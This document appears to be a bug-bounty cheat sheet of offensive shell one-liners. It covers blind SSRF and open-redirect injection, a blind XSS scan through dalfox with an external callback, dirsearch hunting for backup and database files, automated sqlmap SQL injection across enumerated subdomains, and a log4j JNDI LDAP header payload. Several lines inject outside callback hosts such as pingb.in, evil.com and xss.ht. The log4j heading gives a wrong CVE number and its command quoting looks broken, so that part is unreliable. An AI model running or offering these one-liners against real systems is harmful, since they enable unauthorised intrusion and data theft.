# Blind SSRF Oneliner(X-Forwarded-Host):

`echo "testphp.vulnweb.com"|assetfinder|httprobe|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done`

`echo "testphp.vulnweb.com"|assetfinder|httpx|while read url; do ssrf=$(curl -s -L $url -H "X-Forwarded-Host: pingb.in/p/6305faa38a067b8717e6d09db07f");echo -e "$url -> X-Forwarded-Host: injected";done`

# Blind SSRF Oneliner:

`cat wayback.txt|gf ssrf |qsreplace 'https://your-burp-collab.com'|while read url; do ssrf=$(curl -s -L $url);echo -e "$url --> PAYLOAD-INJECTED-SUCCESSFULLY";done`

# Open Redirect Oneliner:

`cat waybackurls_result.txt|grep -a -i \=http|qsreplace 'http://evil.com'|while read host do;do curl -s -L $host -I|grep "evil.com" && echo "$host \033[0;31m[+]VULNERABLE-TO-OPEN-REDIRECT-ATTACK\n";done`

# Blind XSS Oneliner:

`echo testphp.vulnweb.com|gau -subs|grep "https://" |grep -v "png\|jpg\|css\|js\|gif\|txt"|grep "="|uro|dalfox pipe --deep-domxss --multicast --blind akshayravi0479.xss.ht`

# Content Discovery With Dirsearch Oneliner:

`dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u http://target`

# SQLI Oneliner With Sqlmap:
```
1 subfinder -d target.com|tee -a domains.txt
2 cat domains.txt|httpx|tee -a urls-alive.txt
3 cat urls-alive.txt|waybackurls|tee -a urls-check.txt
4 gf sqli urls-check.txt >> sql.url
5 sqlmap -m sql.url --dbs --batch
```

# CVE-2021-4428 log4j Oneliner With User-Agent Payload:

`while read url; do log4=$(curl -s -L $url -H User-Agent: "$\{jndi:ldap://your-pingback-client-url.com}");echo -e "$url -> User-Agent: Fired";done`
